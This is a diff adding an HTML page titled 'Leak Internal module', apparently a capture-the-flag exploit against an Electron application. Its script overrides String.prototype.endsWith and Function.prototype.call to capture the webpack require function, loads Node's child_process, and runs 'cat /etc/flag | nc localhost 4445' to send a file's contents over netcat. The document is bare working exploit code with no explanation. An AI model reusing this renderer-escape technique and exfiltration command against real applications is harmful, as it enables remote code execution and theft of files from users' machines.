@@ -1,0 +1,50 @@
+<html>
+
+<body>
+
+    <h1>Leak Internal module</h1>
+<script>
+
+
+const origEndsWith = String.prototype.endsWith;
+    String.prototype.endsWith = function(...args){
+
+
+        if(args && args[0]==="/electron"){
+
+            console.log(args);
+            return true;
+
+        }
+
+        return origEndsWith.apply(this,args) 
+
+
+
+    }
+
+
+    const originalCall =  Function.prototype.call
+
+    Function.prototype.call = function(... args){ 
+    
+        console.log(args)
+    if( args[3] && args[3].name === '__webpack_require__'){
+    
+      //console.log(args)
+      window.__test= args[3]
+      
+      args[3]("module")._load("child_process").exec("cat /etc/flag | nc localhost 4445")
+    
+    }
+    return originalCall.apply(this,args) 
+    
+    }
+    
+
+</script>
+
+</body>
+
+</html>
+
